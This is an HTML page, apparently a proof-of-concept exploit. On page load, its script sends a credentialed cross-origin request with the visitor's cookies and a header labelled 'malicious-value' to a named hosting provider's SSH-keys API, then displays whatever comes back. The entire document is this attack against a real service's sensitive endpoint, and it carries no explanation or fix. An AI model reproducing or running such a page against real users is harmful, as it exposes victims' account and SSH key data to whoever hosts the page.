<!DOCTYPE html>
<html>
<head>
    <title>Custom Header Test</title>
</head>
<body>
    <script>
        // Attempt to send a request with a custom header
        fetch('https://my.ishosting.com/api/settings/ssh/keys', {
            method: 'GET',
            headers: {
                'X-Authorization': 'malicious-value',
                'Content-Type': 'application/json'
            },
            credentials: 'include' // Send cookies along with the request
        })
        .then(response => response.text())
        .then(data => {
            console.log('Response:', data);
            document.body.innerHTML = `<h1>Request Successful</h1><pre>${data}</pre>`;
        })
        .catch(error => {
            console.error('Error:', error);
            document.body.innerHTML = `<h1>Request Failed</h1><pre>${error}</pre>`;
        });
    </script>
</body>
</html>
